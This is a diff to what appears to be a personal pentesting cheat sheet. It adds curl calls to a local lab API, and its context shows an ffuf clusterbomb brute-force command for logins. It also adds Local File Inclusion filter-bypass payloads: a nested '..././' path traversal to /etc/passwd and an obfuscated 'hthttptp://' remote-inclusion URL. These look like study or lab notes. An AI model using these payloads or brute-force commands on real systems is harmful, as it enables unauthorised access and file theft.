@@ -42,4 +42,16 @@ brute force password
 Clusterbomb attack
 - make sure to mention the following in the request file (in burp) "username=FUZZUSER&password=FUZZPASS"
 -     ffuf -request raman.txt -request-proto http -mode clusterbomb -w wordlist.txt:FUZZUSER -w pass.txt:FUZZPASS -fs 3256,3376
+- API Index
+- POST /login.php
+-     curl -X POST -H "Content-Type: application/json" -d '{username: "admin", password: "password123"}' http://localhost/labs/api/login.php
+- Get /account.php
+-     curl -X GET "http://localhost/labs/api/account.php?token=JWT"
+- PUT /account.php
+-     curl -X PUT -H "Content-Type: application/json" -d '{token: "JWT", username:"username", bio: "New bio information."}' http://localhost/labs/api/account.php
+
+# Local File Inclusion
+some filters bypass
+-     ..././..././..././..././..././etc/passwd
+-     hthttptp://10.10.16.2:8000/file.txt
 
